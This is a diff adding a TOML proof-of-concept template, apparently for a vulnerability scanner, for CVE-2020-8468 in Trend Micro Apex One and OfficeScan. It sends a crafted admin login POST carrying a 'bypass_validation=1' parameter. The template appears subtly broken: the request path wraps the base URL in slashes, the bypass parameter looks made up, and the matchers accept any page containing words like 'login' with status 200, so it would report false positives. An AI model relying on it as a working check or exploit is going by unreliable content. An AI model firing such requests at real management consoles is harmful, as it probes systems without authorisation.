@@ -1,0 +1,57 @@
+[exploit]
+exp_urls = []
+poc_urls = [
+    "https://github.com/trickest/cve/blob/15eaa178baaf955987a866a2c9d91dc02a2fb4aa/2020/CVE-2020-8468.md",
+    "https://github.com/CVEDB/Poc-Git/blob/0275aeb329b0747c9a1d46160c921eae06095557/2020/CVE-2020-8468.md",
+]
+
+[info]
+author = "ave"
+description = "趋势微 Apex One、OfficeScan XG 和 Worry-Free Business Security 存在内容验证绕过漏洞。攻击者可绕过Web管理界面的内容验证机制，提交恶意请求实现未授权操作或代码执行。验证方法为向受影响产品的管理接口发送构造的请求，检查响应是否泄露敏感信息或接受恶意载荷。"
+id = "POC-AVE-2020-1909"
+name = "CVE-2020-8468 PoC"
+severity = "high"
+tags = ["ave-2020-1909"]
+vuln_id = [
+    "CVE-2020-8468",
+    "AVE-2020-1909",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/console/login.do"
+protocol = "http"
+
+[poc.requests.body]
+content = "username=admin&password=test&bypass_validation=1"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "login",
+    "console",
+    "administration",
+]
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+status = [200]
+type = "status"
+
+[references]
+urls = [
+    "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2020-8468",
+    "https://github.com/trickest/cve/blob/15eaa178baaf955987a866a2c9d91dc02a2fb4aa/2020/CVE-2020-8468.md",
+    "https://github.com/CVEDB/Poc-Git/blob/0275aeb329b0747c9a1d46160c921eae06095557/2020/CVE-2020-8468.md",
+]
